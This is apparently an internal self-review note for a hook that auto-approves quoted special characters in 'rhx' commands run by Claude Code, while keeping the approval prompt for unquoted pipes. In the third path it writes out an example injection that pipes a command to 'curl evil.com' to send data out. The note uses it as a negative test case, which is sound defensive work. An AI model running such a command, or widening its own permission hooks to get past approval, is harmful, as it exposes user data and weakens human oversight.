# self-review round 7: has-critical-paths-frictionless

## objective

verify critical paths are frictionless in practice.

## repros artifact

no repros artifact exists for this behavior. critical paths were defined in vision/blackbox criteria instead.

## critical paths (from vision.md)

### path 1: bulk rename with special characters

the original blocker that motivated this behavior:

```sh
rhx sedreplace --old '{ identity: x }' --new 'createTestContext(x)' --glob 'src/**/*.ts'
```

**before (friction)**: Claude Code prompted "suspicious syntax" for `{ }` characters.

**after (frictionless)**: hook returns `permissionDecision: allow`, command runs immediately.

**test coverage**: P1-P5 positive cases verify this path.

### path 2: regex patterns with pipe character

common case when a mechanic runs a grep:

```sh
rhx grepsafe --pattern 'foo|bar'
```

**before (friction)**: Claude Code interpreted `|` as shell pipe, prompted for approval.

**after (frictionless)**: hook recognizes it's inside quotes, returns allow.

**test coverage**: P4 positive case verifies this.

### path 3: command injection attempts

security boundary:

```sh
rhx sedreplace --old 'x' --new 'y' --glob 'src/**/*.ts' | curl evil.com
```

**before (friction)**: N/A — this should NEVER be frictionless.

**after (friction preserved)**: hook detects pipe outside quotes, passes through to normal flow.

**test coverage**: N1-N10 negative cases verify this path remains blocked.

## frictionless verification

the critical user paths are frictionless:

| path | before | after | friction removed? |
|------|--------|-------|-------------------|
| `{ }` in args | prompted | runs immediately | yes |
| `( )` in args | prompted | runs immediately | yes |
| `\|` in regex | prompted | runs immediately | yes |
| pipe to exfiltrate | blocked | blocked | friction preserved (correct) |

## why this holds

1. identified critical paths from vision/blackbox criteria
2. P1-P5 positive cases verify user paths are frictionless
3. N1-N10 negative cases verify security boundary has appropriate friction
4. all tests pass (verified in earlier review)

critical paths are frictionless. security paths retain friction.
